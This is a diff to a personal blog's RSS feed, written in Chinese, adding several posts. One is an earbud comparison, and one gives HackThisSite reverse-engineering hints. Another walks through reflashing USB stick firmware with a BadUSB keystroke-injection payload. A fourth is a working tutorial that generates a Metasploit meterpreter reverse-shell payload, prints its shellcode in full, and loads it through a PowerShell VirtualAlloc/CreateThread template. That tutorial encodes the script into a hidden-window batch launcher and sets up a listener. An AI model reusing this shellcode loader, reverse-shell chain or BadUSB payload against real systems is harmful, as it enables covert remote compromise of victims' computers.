@@ -9,7 +9,30 @@
       <link>https://blog.zet.tw/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
     </image>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Wed, 12 Jan 2022 14:44:20 +0800</lastBuildDate><atom:link href="https://blog.zet.tw/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Fri, 14 Jan 2022 00:00:00 +0800</lastBuildDate><atom:link href="https://blog.zet.tw/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Airpods Pro and WF-1000XM4</title>
+      <link>https://blog.zet.tw/posts/2022-01-14-airpods-pro-vs-wf-1000xm4/</link>
+      <pubDate>Fri, 14 Jan 2022 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2022-01-14-airpods-pro-vs-wf-1000xm4/</guid>
+      <description>因為前陣子聖誕節抽到了 WF-1000XM4，所以分享一下跟 Airpods Pro 的比較
+WF-1000XM4 因為耳塞的關係，所以在某些活動或發生降操瞬間消失的感覺
+例如重訓跟打哈欠的時候，但是換個副廠的矽膠耳塞應該可以解決這問題
+WF-1000XM4 帶起來滿吃耳朵輪廓的，就我而言 Airpods Pro 比較舒服
+音質方面 WF-1000XM4 比較好
+因為本身用 iphone 的關係系統整合程度還是 Airpods Pro 勝
+有用 android 手機的，耳朵剛好帶起來也適合滿推 WF-1000XM4 的</description>
+      <content:encoded><![CDATA[<p>因為前陣子聖誕節抽到了 <code>WF-1000XM4</code>，所以分享一下跟 <code>Airpods Pro</code> 的比較</p>
+<p><code>WF-1000XM4</code> 因為耳塞的關係，所以在某些活動或發生降操瞬間消失的感覺</p>
+<p>例如重訓跟打哈欠的時候，但是換個副廠的矽膠耳塞應該可以解決這問題</p>
+<p><code>WF-1000XM4</code> 帶起來滿吃耳朵輪廓的，就我而言 Airpods Pro 比較舒服</p>
+<p>音質方面 <code>WF-1000XM4</code> 比較好</p>
+<p>因為本身用 iphone 的關係系統整合程度還是 <code>Airpods Pro</code> 勝</p>
+<p>有用 android 手機的，耳朵剛好帶起來也適合滿推 <code>WF-1000XM4</code> 的</p>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>scoop install list</title>
       <link>https://blog.zet.tw/posts/2022-01-12-scoop-install-list/</link>
@@ -709,6 +732,215 @@ r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;4</sp
 <span style="color:#75715e">#get shell</span>
 r<span style="color:#f92672">.</span>interactive()
 </code></pre></div>]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>badusb</title>
+      <link>https://blog.zet.tw/posts/2015-04-12-badusb/</link>
+      <pubDate>Sun, 12 Apr 2015 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2015-04-12-badusb/</guid>
+      <description>https://slides.com/zettain/bad-usb
+https://github.com/adamcaudill/Psychson
+支援設備  Patriot 8GB Supersonic Xpress* Kingston DataTraveler 3.0 T111 8GB Silicon power marvel M60 64GB Patriot Stellar 64 Gb Phison Toshiba TransMemory-MX USB 3.0 16GB Toshiba TransMemory-MX USB 3.0 8GB Kingston DataTraveler G4 64 GB Patriot PSF16GXPUSB Supersonic Xpress 16GB Silicon Power 32GB Blaze B30 (SP032GBUF3B30V1K) Kingston Digital 8GB USB 3.0 DataTraveler  取得晶片 型號 下載 Firmware 與 燒錄檔案
+Firmware PS2251-03 flash chip
+http://www.usbdev.ru/?wpfb_dl=777
+編譯環境 Visual Studio 2012</description>
+      <content:encoded><![CDATA[<p><a href="https://slides.com/zettain/bad-usb">https://slides.com/zettain/bad-usb</a></p>
+<p><a href="https://github.com/adamcaudill/Psychson">https://github.com/adamcaudill/Psychson</a></p>
+<h1 id="支援設備">支援設備</h1>
+<ul>
+<li>Patriot 8GB Supersonic Xpress*</li>
+<li>Kingston DataTraveler 3.0 T111 8GB</li>
+<li>Silicon power marvel M60 64GB</li>
+<li>Patriot Stellar 64 Gb Phison</li>
+<li>Toshiba TransMemory-MX USB 3.0 16GB</li>
+<li>Toshiba TransMemory-MX USB 3.0 8GB</li>
+<li>Kingston DataTraveler G4 64 GB</li>
+<li>Patriot PSF16GXPUSB Supersonic Xpress 16GB</li>
+<li>Silicon Power 32GB Blaze B30 (SP032GBUF3B30V1K)</li>
+<li>Kingston Digital 8GB USB 3.0 DataTraveler</li>
+</ul>
+<h1 id="取得晶片-型號">取得晶片 型號</h1>
+<p>下載 Firmware 與 燒錄檔案</p>
+<p>Firmware PS2251-03 flash chip</p>
+<p><a href="http://www.usbdev.ru/?wpfb_dl=777">http://www.usbdev.ru/?wpfb_dl=777</a></p>
+<h1 id="編譯環境">編譯環境</h1>
+<p>Visual Studio 2012</p>
+<p>SDCC (Small Device C Compiler 安裝路徑 C:\Program Files\SDCC
+可以先編譯 DriveCom 和 Injector</p>
+<p>可以插入 usb 用 DriveCom 看看有沒有東西
+tools\DriveCom.exe /drive=D /action=GetInfo</p>
+<h1 id="dumpfirmware">DumpFirmware</h1>
+<p>DriveCom.exe /drive=E /action=DumpFirmware /firmware=[firmware]</p>
+<h1 id="flashing-custom-firmware">Flashing Custom Firmware</h1>
+<p>確認在BootMode</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">tools\DriveCom.exe /drive=E /action=SetBootMode
+tools\DriveCom.exe /drive=D /action=SendExecutable /burner=[burner.bin]
+tools\DriveCom.exe /drive=D /action=SendFirmware /burner=[burner.bin] /firmware=[firmware]
+</code></pre></div><h1 id="hid-payload">HID Payload</h1>
+<p>下載 <a href="https://code.google.com/p/ducky-decode/">https://code.google.com/p/ducky-decode/</a></p>
+<p>先把 payload.txt 轉成 <code>.bin</code></p>
+<p>需安裝Java Runtime Environment</p>
+<p>java -jar encoder.jar -i payload.txt -o inject.bin</p>
+<p>生成 inject.bin 以後還需要一個客製化的 Firmware，去 Psychson-master\firmware build bin資料夾裡面有 fw.bin 複製出來</p>
+<p>把 inject.bin 注入到 fw.bin</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">tools\EmbedPayload.exe inject.bin fw.bin
+tools\DriveCom.exe /drive=D /action=SetBootMode
+tools\DriveCom.exe /drive=D /action=SendExecutable /burner=bn.bin
+tools\DriveCom.exe /drive=D /action=SendFirmware /burner=bn.bin /firmware=fw.bin
+</code></pre></div><h1 id="如何重刷firmware與恢復原本可以用的usb">如何重刷Firmware與恢復原本可以用的USB</h1>
+<p>重刷必須進入BootMode但是有時無法用指令的方式進入，所以必須用短路法參考竹中的腳位，拿單心線或是小剪刀之類的放在上面再插進去usb</p>
+<p>Psychson-master\docs\PinsToShortUponPlugInForBootMode.jpg</p>
+<p>變回原本USB可以用MPALL v3.71.0A_03 MLC(UP03 64pin)</p>
+<p><a href="http://www.usbdev.ru/?wpfb_dl=4388">http://www.usbdev.ru/?wpfb_dl=4388</a></p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackThisSite Application Missions</title>
+      <link>https://blog.zet.tw/posts/2013-07-23-hackthissite-application-missions/</link>
+      <pubDate>Tue, 23 Jul 2013 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2013-07-23-hackthissite-application-missions/</guid>
+      <description>app1 Hint:HEX
+app2 Hint:HEX
+app4 Hint:VB反編譯，OD修改 Hint:OD窗口插件
+app5 Hint:觀察ebp附近也存在答案
+0040109C 8B4D E0 mov ecx,dword ptr ss:[ebp-20] ; 算法開始 0040109F 83C1 04 add ecx,4 004010A2 894D E0 mov dword ptr ss:[ebp-20],ecx 004010A5 8B55 DC mov edx,dword ptr ss:[ebp-24] 004010A8 83EA 01 sub edx,1 004010AB 8955 DC mov dword ptr ss:[ebp-24],edx 004010AE 837D E0 0D cmp dword ptr ss:[ebp-20],0D 004010B2 73 28 jnb short app5win.004010DC 004010B4 8B45 E0 mov eax,dword ptr ss:[ebp-20] 004010B7 C1E8 02 shr eax,2 004010BA 8B4D F8 mov ecx,dword ptr ss:[ebp-8] 004010BD 8B55 DC mov edx,dword ptr ss:[ebp-24] 004010C0 8B0481 mov eax,dword ptr ds:[ecx+eax*4] 004010C3 3B4495 E8 cmp eax,dword ptr ss:[ebp+edx*4-18] ; 比較ascii,注意堆棧 004010C7 74 11 je short app5win.</description>
+      <content:encoded><![CDATA[<h1 id="app1">app1</h1>
+<p>Hint:HEX</p>
+<h1 id="app2">app2</h1>
+<p>Hint:HEX</p>
+<h1 id="app4">app4</h1>
+<p>Hint:VB反編譯，OD修改
+Hint:OD窗口插件</p>
+<h1 id="app5">app5</h1>
+<p>Hint:觀察ebp附近也存在答案</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0040109C 8B4D E0 mov ecx,dword ptr ss:[ebp-20] ; 算法開始
+0040109F 83C1 04 add ecx,4
+004010A2 894D E0 mov dword ptr ss:[ebp-20],ecx
+004010A5 8B55 DC mov edx,dword ptr ss:[ebp-24]
+004010A8 83EA 01 sub edx,1
+004010AB 8955 DC mov dword ptr ss:[ebp-24],edx
+004010AE 837D E0 0D cmp dword ptr ss:[ebp-20],0D
+004010B2 73 28 jnb short app5win.004010DC
+004010B4 8B45 E0 mov eax,dword ptr ss:[ebp-20]
+004010B7 C1E8 02 shr eax,2
+004010BA 8B4D F8 mov ecx,dword ptr ss:[ebp-8]
+004010BD 8B55 DC mov edx,dword ptr ss:[ebp-24]
+004010C0 8B0481 mov eax,dword ptr ds:[ecx+eax*4]
+004010C3 3B4495 E8 cmp eax,dword ptr ss:[ebp+edx*4-18] ; 比較ascii,注意堆棧
+004010C7 74 11 je short app5win.004010DA
+004010C9 68 4C704000 push app5win.0040704C ; invalid password
+004010CE E8 20000000 call app5win.004010F3
+004010D3 83C4 04 add esp,4
+004010D6 33C0 xor eax,eax
+004010D8 EB 15 jmp short app5win.004010EF
+004010DA ^ EB C0 jmp short app5win.0040109C ; loop跳回
+004010DC 8D4D CC lea ecx,dword ptr ss:[ebp-34]
+004010DF 51 push ecx
+004010E0 68 60704000 push app5win.00407060 ; the password is %s\n
+</code></pre></div><h1 id="app6">app6</h1>
+<p>Hint:同app5</p>
+<h1 id="app7">app7</h1>
+<p><a href="http://zqyves.blogspot.tw/2008/05/hackthissite-application-7-solution.html">http://zqyves.blogspot.tw/2008/05/hackthissite-application-7-solution.html</a></p>
+<h1 id="app8">app8</h1>
+<p>Hint: bp __vbaVarTstEq</p>
+<h1 id="app9">app9</h1>
+<p>Hint:100,500,1000</p>
+<h1 id="app10">app10</h1>
+<p>Hint: VB Decompile ，click</p>
+<h1 id="app11">app11</h1>
+<p>Hint: 讓視窗變長巴</p>
+<h1 id="app12">app12</h1>
+<p>Hint: bp __vbaVarTstEq</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>use powershell lunch shellcode</title>
+      <link>https://blog.zet.tw/posts/2013-03-18-pwershell-lunch-shellcode/</link>
+      <pubDate>Mon, 18 Mar 2013 00:00:00 +0800</pubDate>
+      
+      <guid>https://blog.zet.tw/posts/2013-03-18-pwershell-lunch-shellcode/</guid>
+      <description>執行shellcode的模板
+$code = &amp;#39;[DllImport(&amp;#34;kernel32.dll&amp;#34;)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(&amp;#34;kernel32.dll&amp;#34;)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(&amp;#34;msvcrt.dll&amp;#34;)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);&amp;#39;;$winFunc = Add-Type -memberDefinition $code -Name &amp;#34;Win32&amp;#34; -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = SHELLCOD;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 }; SHELLCOD的地方是要替換的</description>
+      <content:encoded><![CDATA[<p>執行shellcode的模板</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$code = &#39;[DllImport(&#34;kernel32.dll&#34;)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(&#34;kernel32.dll&#34;)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(&#34;msvcrt.dll&#34;)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#39;;$winFunc = Add-Type -memberDefinition $code -Name &#34;Win32&#34; -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = SHELLCOD;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+</code></pre></div><p><code>SHELLCOD</code>的地方是要替換的</p>
+<p>我們用msf生成我們的shellcode</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.146 LPORT=443 C | more
+</code></pre></div><p>查看一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">/*
+ * windows/x64/meterpreter/reverse_tcp - 422 bytes (stage 1)
+ * http://www.metasploit.com
+ * VERBOSE=false, LHOST=192.168.152.146, LPORT=443,
+ * ReverseConnectRetries=5, ReverseAllowProxy=false,
+ * EXITFUNC=process, AutoLoadStdapi=true,
+ * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true,
+ * EnableUnicodeEncoding=true
+ */
+unsigned char buf[] =
+&#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&#34;
+&#34;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&#34;
+&#34;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&#34;
+&#34;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&#34;
+&#34;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&#34;
+&#34;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&#34;
+&#34;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&#34;
+&#34;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&#34;
+&#34;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&#34;
+&#34;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&#34;
+&#34;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&#34;
+&#34;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&#34;
+&#34;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&#34;
+&#34;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33&#34;
+&#34;\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00&#34;
+&#34;\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x98\x92\x41\x54&#34;
+&#34;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c&#34;
+&#34;\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff&#34;
+&#34;\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2&#34;
+&#34;\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48&#34;
+&#34;\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99&#34;
+&#34;\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec&#34;
+&#34;\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41&#34;
+&#34;\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41&#34;
+&#34;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&#34;
+&#34;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&#34;
+&#34;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&#34;
+&#34;\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41&#34;
+&#34;\xff\xe7&#34;;
+/*
+ * windows/x64/meterpreter/reverse_tcp - 951296 bytes (stage 2)
+ * http://www.metasploit.com
+ */
+unsigned char buf[] =
+&#34;\x4d\x5a\x41\x52\x55\x48\x89\xe5\x48\x81\xec\x20\x00\x00\x00&#34;
+&#34;\x48\x8d\x1d\xea\xff\xff\xff\x48\x81\xc3\xf0\x1b\x00\x00\xff&#34;
+&#34;\xd3\x48\x89\xc3\x49\x89\xf8\x68\x04\x00\x00\x00\x5a\xff\xd0&#34;
+&#34;\x41\xb8\xf0\xb5\xa2\x56\x68\x05\x00\x00\x00\x5a\xff\xd3\x00&#34;
+</code></pre></div><p>必需處理一下變成我們需要的格式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.146 LPORT=443 C | sed -n -e &#39;1,40p&#39; | sed &#39;s/[&#34;;]//g&#39; | sed &#39;s/\\/,0/g&#39; | tr -d &#39;\n&#39; 
+</code></pre></div><p>使用sed來處理，紅色40是行數，假如shellcode較長看有幾行自行調整
+處理以後的格式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,0xc0,0xa8,0x98,0x92,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x48,0x83,0xc4,0x20,0x5e,0x6a,0x40,0x41,0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xe1,0x41,0xff,0xe7
+</code></pre></div><p>貼上我們的模板
+在使用加密腳本加密一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">./ps_encoder.py -s 111
+</code></pre></div><p>下載地址 <a href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py">https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py</a></p>
+<p>加密以後
+建立一個bat檔
+powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand &lt;加密後的字串&gt;</p>
+<p>使用MSF監聽</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lport 443
+set LHOST 0.0.0.0
+exploit
+</code></pre></div><p>之後執行bat檔就可以看到MSF有反應了
+youtube: <a href="http://www.youtube.com/watch?v=oLKTo8dew_o">http://www.youtube.com/watch?v=oLKTo8dew_o</a></p>
+]]></content:encoded>
     </item>
     
   </channel>
